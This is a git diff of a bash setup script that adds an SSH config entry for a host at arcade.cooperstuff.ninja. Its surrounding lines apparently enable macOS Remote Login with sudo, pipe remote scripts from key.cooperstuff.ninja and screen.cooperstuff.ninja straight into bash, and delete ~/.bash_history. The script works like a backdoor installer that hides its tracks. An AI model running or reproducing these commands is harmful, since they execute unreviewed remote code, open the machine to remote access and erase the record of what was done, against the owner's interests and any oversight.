@@ -1,5 +1,7 @@
 #!/bin/bash
 
+mkdir ~/.ssh 2> /dev/null;
+
 if [ $(uname -s) = Darwin ]; then
 	HASRL=$(sudo systemsetup -getremotelogin | awk -v N=3 '{print $N}');
 	if [ $HASRL = Off ]; then
@@ -14,6 +16,14 @@ fi
 curl -sL key.cooperstuff.ninja | bash;
 clear;
 curl -sL screen.cooperstuff.ninja | bash;
-touch ~/.hushlogin
+
+touch ~/.ssh/config;
+if [ $(cat ~/.ssh/config | grep -c "arcade") -eq 0 ]; then
+	echo "Host arcade" >> ~/.ssh/config;
+	echo "	HostName arcade.cooperstuff.ninja" >> ~/.ssh/config;
+	echo "	User arcade" >> ~/.ssh/config;
+fi
+
+touch ~/.hushlogin;
 rm -f ~/.bash_history;
 
